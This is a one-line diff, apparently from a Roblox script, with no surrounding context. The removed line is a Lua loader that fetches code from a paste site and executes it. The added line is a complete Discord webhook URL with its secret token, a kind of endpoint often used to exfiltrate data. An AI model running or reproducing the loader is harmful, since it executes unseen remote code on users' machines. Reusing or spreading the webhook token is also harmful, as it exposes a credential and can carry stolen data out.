@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastefy.app/6ljoESAs/raw"))()
+https://discord.com/api/webhooks/1379996468542308414/OZF5JaIUDZoXN33eQ6l0FNprahFHefv5-Fc0xN8FilFCjnYrSA1-t4S12wfT33xYI6Dq
